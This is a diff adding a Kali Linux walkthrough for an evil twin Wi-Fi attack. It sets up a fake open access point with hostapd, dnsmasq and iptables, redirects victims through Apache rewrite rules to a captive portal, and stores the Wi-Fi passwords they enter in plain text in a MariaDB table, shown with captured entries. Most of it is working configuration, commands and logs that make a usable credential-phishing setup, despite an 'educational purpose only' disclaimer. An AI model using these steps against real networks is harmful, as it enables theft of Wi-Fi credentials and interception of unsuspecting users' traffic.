@@ -1,0 +1,512 @@
+NOTE: THE BELOW IS PURELY FOR EDUCATIONAL PURPOSE ONLY....
+
+
+How does Evil Twin Attack work?
+########################################################################################################################
+This attack creates a false access point (captive login portal) and forces the victim/user to enter their wifi password 
+to this fake access point by de-authenticating them from the real access point; once the password is entered, the 
+victim/user is redirected to the real access point.
+
+
+
+Topology
+#########################################################################################################################
+Wi-Fi Client (Wi-Fi)========= (wlan0 Fake AP Beacon Interface) Laptop (wlan1, which is inbuild Wi-Fi is used as WAN) ============= (Mobile Hostspot for providing internet to Laptop)
+
+Here, wlan0 is "TP-Link Archer T2U Plus a.k.a AC600 High-Gain" Wireless USB dongle. This supports monitor mode 
+and can be used along with airmon-ng tool to check the list of Access points in the vicinity, on which, 
+the evil twin attack could be performed.
+
+This adapter has a Realtek RTL8821AU Chipset at its heart. RTL8821AU has plenty of developer support in
+linux community and has driver for Kali linux , Parrot OS .etc Archer T2U Plus is on sale under 15 USD ~ 1000
+INR , which is a very aordable price for Beginners in Pentesting. 2357:0120 is the USB ID.
+
+┌──(kali㉿kali)-[~]
+└─$ lsusb | grep RTL
+Bus 003 Device 005: ID 2357:0120 TP-Link Archer T2U PLUS [RTL8821AU]  <====
+
+
+########################################################################################################################
+The below is the list of tools that we would need to set up fake Access points:
+########################################################################################################################
+1. Aircrack-ng suite:
+   for monitoring Access Points.
+2. hostapd:
+   Host access point daemon is a software access point that lets the user 
+   use his/her wireless adapter to broadcast beacons from any linux device.
+3.    
+   dnsmasq: 
+   Dnsmasq has Dynamic Host Configuration Protocol (DHCP) server to allocate IP addresses to the clients and 
+   DNS server that is used to resolve DNS requests from or to a machine.
+   
+4.    
+   iptables: 
+   To create a NAT table that from WLAN end to WAN end so that the users connected to the Fake AP on LAN end
+   will be able to access internet from the WAN end of the device, which is connected to Wi-Fi hotspot that provides
+   internet or to the internet service provider directly via ethernet port. 
+   in our case, we would use mobile hotspot to provide internet to the WLAN interface of the device and this interface
+   would be used as the WAN port of the Wi-Fi Access point. 
+
+5. 
+   apache2: local server service already installed in Kali, 
+            to host our Captive Portal website for the WLAN client that would
+            connect the Fake AP.
+
+6.            
+   Captive Portal Website:
+   The web interface that will pop up when the victim logs in to our evil twin AP.
+   
+7. 
+   MySQL Database Service:
+   The Captive portal saves the credentials to a Database that we will set up.
+
+
+Summary of Steps to be done
+#########################################################################################################################
+1.    Setup DNSmasq conf
+2.    Setup Hostapd conf
+3.    Setup iptables rules
+4.    Setup Apache2 Rewrite Rules
+5.    Captive Portal Setup
+6.    Setup MySQL Database
+
+
+
+
+Steps to Find List of Access point and get the AP's BSSID and SSID Name and Wi-Fi interface MAC
+address so that we can set up a Fake access point similar to that AP, we wish to attack. 
+##################################################################################################
+
+
+
+Steps to Set up Fake Access Points
+##################################################################################################
+
+1.
+Install dnsmasq package:
+#########################################################################################################
+sudo apt-get install dnsmasq -y
+
+2. 
+Install hostapd package
+#########################################################################################################
+sudo apt-get install hostapd
+
+3.
+Create dnsmasq configuration file. 
+#########################################################################################################
+
+┌──(kali㉿kali)-[~]
+└─$ cat dnsmasq.conf 
+#Set the wifi interface
+interface=wlan0
+
+#Set the IP range that can be given to clients
+dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,8h
+
+#Set the gateway IP address
+dhcp-option=3,10.0.0.1
+
+#Set DNS server address
+dhcp-option=6,10.0.0.1
+
+#Set Server
+server=8.8.8.8
+
+#logs
+log-queries
+log-dhcp
+
+#Redirect all requests to 10.0.0.1
+address=/#/10.0.0.1
+
+4.
+Create hostapd configuration file and ensure that the authentication is open. The idea is to fool 
+the end user into entering the Wi-Fi password into captiveportal.
+#########################################################################################################
+
+└─$ cat hostapd.conf 
+country_code=IN
+interface=wlan0
+driver=nl80211
+ssid=1_i_am_tony_stark
+hw_mode=a
+channel=48
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+#wpa=2
+#wpa_passphrase=admin123
+#wpa_key_mgmt=WPA-PSK
+#wpa_pairwise=TKIP
+#rsn_pairwise=CCMP
+
+Note: 
+Please note that the wlan0 interface is the "RTL8821AU" Wi-Fi usb dongle device,
+which will be used for broadcasting the beacons out of the FAKE AP.
+
+┌──(kali㉿kali)-[~]
+└─$ iwconfig wlan0
+wlan0     IEEE 802.11AC  ESSID:"Sparrow_5GHz"  Nickname:"<WIFI@REALTEK>"
+          Mode:Managed  Frequency:5.26 GHz  Access Point: 04:F1:28:3E:80:E7   
+          Bit Rate:434 Mb/s   Sensitivity:0/0  
+          Retry:off   RTS thr:off   Fragment thr:off
+          Power Management:off
+          Link Quality=43/100  Signal level=92/100  Noise level=0/100
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+
+
+
+5. 
+in point 4, we can see that the wlan0 interface is in Managed mode. 
+we would now need to place this interface into monitor mode. 
+
+sudo airmon-ng start wlan0
+
+Logs:
+################
+┌──(kali㉿kali)-[~]
+└─$ sudo airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+   1640 NetworkManager
+   1714 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           88XXau          TP-Link Archer T2U PLUS [RTL8821AU]
+                (monitor mode enabled)
+phy1    wlan1           iwlwifi         Intel Corporation Wi-Fi 6 AX200 (rev 1a)
+
+
+
+6.
+Change the Channel of wlan0 interface to 48, which is 5 GHz spectrum channel.
+This is the same channel that is set in the hostapd configuration file of this
+interface. When hostapd process is spawned, it would check if the wlan0 interface
+is in the same channel as the one it's saved in the hostapd configuration file. 
+###########################################################################################
+sudo iwconfig wlan0 channel 48
+
+Logs:
+###########################################################################################
+┌──(kali㉿kali)-[~]
+└─$ sudo iwconfig wlan0 channel 48
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ iwconfig wlan0           
+wlan0     unassociated  ESSID:""  Nickname:"<WIFI@REALTEK>"
+          Mode:Monitor  Frequency=5.24 GHz  Access Point: Not-Associated   
+          Sensitivity:0/0  
+          Retry:off   RTS thr:off   Fragment thr:off
+          Power Management:off
+          Link Quality:0  Signal level:0  Noise level:0
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+
+                                                                                                                                                                                                                                           ┌──(kali㉿kali)-[~]
+└─$ iw dev        
+phy#1
+        Interface wlan1
+                ifindex 4
+                wdev 0x100000001
+                addr e0:2b:e9:1a:64:c2
+                type managed
+                channel 52 (5260 MHz), width: 80 MHz, center1: 5290 MHz
+                txpower 22.00 dBm
+                multicast TXQ:
+                        qsz-byt qsz-pkt flows   drops   marks   overlmt hashcol tx-bytes        tx-packets
+                        0       0       0       0       0       0       0       0               0
+phy#0
+        Interface wlan0
+                ifindex 3
+                wdev 0x1
+                addr 98:48:27:83:5b:3d
+                type monitor
+                channel 48 (5240 MHz), width: 20 MHz, center1: 5240 MHz  <================
+                txpower 20.00 dBm
+                
+                
+ 7.
+ Allocate IP and Subnet mask to the wlan0 interface.
+ The IP address of the wlan0 interface would be gateway ip address
+ as this is the interface to which the clients would be connected
+ to the Fake accesspoint.  Note that the gateway ip address is part of the
+ DHCP address pool that has been allocated as part of dnsmasq configuration file, 
+ in point 3.
+#######################################################################################################################
+
+sudo ifconfig wlan0 up 10.0.0.1 netmask 255.255.255.0               
+
+      
+Logs:
+###########################################################################################
+┌──(kali㉿kali)-[~]
+└─$ ifconfig wlan0                                  
+wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 2312
+        inet 10.0.0.1  netmask 255.255.255.0  broadcast 10.0.0.255
+        inet6 2401:4900:234a:1653:d3:10bf:4848:fcfe  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::56f5:a93b:fbe1:9e3a  prefixlen 64  scopeid 0x20<link>
+        unspec 98-48-27-83-5B-3D-48-7A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
+        RX packets 632768  bytes 12149 (11.8 KiB)
+        RX errors 0  dropped 632613  overruns 0  frame 0
+        TX packets 36  bytes 5602 (5.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+9.
+Since, 10.0.0.1 is the gateway ip address of the wlan0 interface, we would need to 
+add this network 10.0.0.0 to the route table of the system.       
+##########################################################################################################################                  
+sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+                                                                                                                                                                                                                                           Logs:
+                                                                                                                                                                                                                                           ############################################################################################## 
+┌──(kali㉿kali)-[~]
+└─$ route -n                                                      
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         192.168.43.219  0.0.0.0         UG    600    0        0 wlan1
+10.0.0.0        10.0.0.1        255.255.255.0   UG    0      0        0 wlan0  <==================== 10.0.0.0/24 network got added to the route table.
+10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 wlan0
+192.168.43.0    0.0.0.0         255.255.255.0   U     600    0        0 wlan1
+
+
+10.
+Now, turn on the Fake Access Point so that the wlan0 interface can start broadcasting 
+beacons as well as accept client connections:
+#################################################################################################
+
+sudo hostapd -B -d hostapd.conf &
+
+
+11.
+Start dhcp server for allocating ip address to the STA's connected to the Fake AP's wlan0 interface.
+####################################################################################################
+sudo dnsmasq -C dnsmasq.conf -d &
+
+
+12.
+Now, create ip table NAT rule to route internet from wlan1 interface which is connected to internet
+to wlan0, which is currently acting as fake access point.
+####################################################################################################
+sudo iptables --flush
+sudo iptables --table nat --append POSTROUTING --out-interface wlan1 -j MASQUERADE 
+sudo iptables --append FORWARD --in-interface wlan0mon -j ACCEPT 
+sudo iptables -t nat -A POSTROUTING -j MASQUERADE
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+13.
+Setup Apache2 Rewrite Rules so that every new connection to the fake up would redirect the captive portal. 
+############################################################################################################################
+
+You need to add some code on the apache2 configuration file that you can find in kali at /etc/apache2/sites-enabled/000-default.conf once you have found it you can use gedit to open it, and paste the following chunk of code under the </VirtualHost> tag:
+
+<Directory "/var/www/html">
+	RewriteEngine On
+	RewriteBase /
+	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+	RewriteRule ^(.*)$ %1/$1 [R=301,L]
+	
+	RewriteCond %{REQUEST_FILENAME} !-f
+	RewriteCond %{REQUEST_FILENAME} !-d
+	RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+
+And then run a2enmod rewrite
+
+14.
+Now, Copy the Captiveportal project code into 
+/var/www/html.
+
+Start the apache server with command
+###########################################################################
+service apache2 start
+
+Note: we can locally validate the webpage from the apache server
+in the laptop by opening the webbroweser and entering the below:
+
+localhost
+
+Note: The default folder that apache serves the HTML files from is /var/www.
+since, we have copied our captiveportal project into /var/www, we can see
+that the webpage would load now. 
+
+14.
+Now start my mysql service. 
+
+Command:
+===========================================================
+service mysql start
+
+15.
+Now that we have started mysql service, we can now create a database
+to store the password in plain string, that the fool user enters in the 
+fake AP's captive portal. 
+
+Execute the below command and when it prompts for password, simply press enter. 
+
+┌──(kali㉿kali)-[~]
+└─$ sudo mysql -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 33
+Server version: 10.6.10-MariaDB-1+b1 Debian n/a
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+
+16. 
+Now create the database:
+##########################################################################################
+MariaDB [(none)]> create database eviltwin;
+Query OK, 1 row affected (0.001 sec)
+
+MariaDB [(none)]> use eviltwin
+Database changed
+MariaDB [eviltwin]> 
+
+17.
+Create a new user and grant him all the priveledges for the DB. 
+###########################################################################################
+MariaDB [eviltwin]>  drop user 'dodgers'@'localhost';
+Query OK, 0 rows affected (2.492 sec)
+
+MariaDB [eviltwin]> create user dodgers@localhost identified by 'duck';
+Query OK, 0 rows affected (0.005 sec)
+
+MariaDB [eviltwin]> grant all privileges on eviltwin.* to 'dodgers'@'localhost' ;
+Query OK, 0 rows affected (0.004 sec)
+
+18.
+Now, create the table in the eviltwin database for storing passwords entered by the users
+via captive portal. 
+
+MariaDB [eviltwin]> create table wpa_keys(password1 varchar(32), password2 varchar(32));
+Query OK, 0 rows affected (0.037 sec)
+
+MariaDB [eviltwin]> show tables;
++--------------------+
+| Tables_in_eviltwin |
++--------------------+
+| wpa_keys           |
++--------------------+
+1 row in set (0.001 sec)
+
+
+19.
+Now, try connecting the client to the Fake AP's SSID and the user would be redirected to captive portal. 
+once, the user enters the password, we can see the passwords being stored in maria DB.
+############################################################################################################
+
+SELECT * FROM wpa_keys;
+
+
+we can see all the passwords entered by the user in the MariaDB. 
+
+MariaDB [eviltwin]> SELECT * FROM wpa_keys
+    -> ;
++-----------------+-----------------+
+| password1       | password2       |
++-----------------+-----------------+
+| admin123        | admin123        |
+| admin123        | admin123        |
+| aEz4HzPZgKppwWg | aEz4HzPZgKppwWg |
+|                 |                 |
+| admin123        | admin123        |
+| admin123        | admin123        |
+| admin123        | admin123        |
+| admin123        | admin123        |
+| admin123        | admin123        |
+| admin123        | admin123        |
+|                 |                 |
+| admin123        | admin123        |
++-----------------+-----------------+
+
+20.
+SUCCESS.
+
+
+
+
+
+
+
+
+Some Handy commands:
+##########################################################################
+
+1.
+Command to Stop wpa supplicant service
+######################################################################
+sudo systemctl mask wpa_supplicant.service
+sudo systemctl stop wpa_supplicant.service
+wpa_cli terminate -i wlan0
+
+Command to start wpa_supplicant service
+######################################################################
+sudo systemctl unmask wpa_supplicant.service
+
+2.
+How to forget Wi-Fi network from kali linux laptop for a specific Wi-Fi interface. 
+
+└─$ nmcli -t -f TYPE,UUID,NAME con 
+802-11-wireless:6c5759b1-4878-456a-8cc5-12612fbd84c9:Sparrow_5GHz
+802-11-wireless:2760731a-7431-478e-99ba-d43f44cd381c:Sparrow_5GHz 1
+802-3-ethernet:c3f9e831-eec3-3bee-859a-98148d06dd47:Wired connection 1
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ sudo nmcli c delete 6c5759b1-4878-456a-8cc5-12612fbd84c9 
+Connection 'Sparrow_5GHz' (6c5759b1-4878-456a-8cc5-12612fbd84c9) successfully deleted.
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ sudo nmcli c delete 2760731a-7431-478e-99ba-d43f44cd381c
+Connection 'Sparrow_5GHz 1' (2760731a-7431-478e-99ba-d43f44cd381c) successfully deleted.
+                                                                                          
+
+
+
+Quick steps to execute:
+#########################################################################################
+
+# Kill hostapd and dhcp and dns process.
+sudo killall hostapd
+sudo killall dnsmasq
+
+# Flush all the iptables
+iptables -F
+iptables -X
+iptables -t nat -F
+iptables -t nat -X
+iptables -t mangle -F
+iptables -t mangle -X
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+
+
+sudo airmon-ng start wlan0
+sudo iwconfig wlan0 channel 48
+sudo ifconfig wlan0 up 10.0.0.1 netmask 255.255.255.0
+sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+sudo hostapd -B -d hostapd.conf &
+sudo dnsmasq -C dnsmasq.conf -d &
+sudo iptables --flush
+sudo iptables --table nat --append POSTROUTING --out-interface wlan1 -j MASQUERADE 
+sudo iptables --append FORWARD --in-interface wlan0 -j ACCEPT 
+sudo iptables -t nat -A POSTROUTING -j MASQUERADE
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+service apache2 restart
+
+
+
+
+
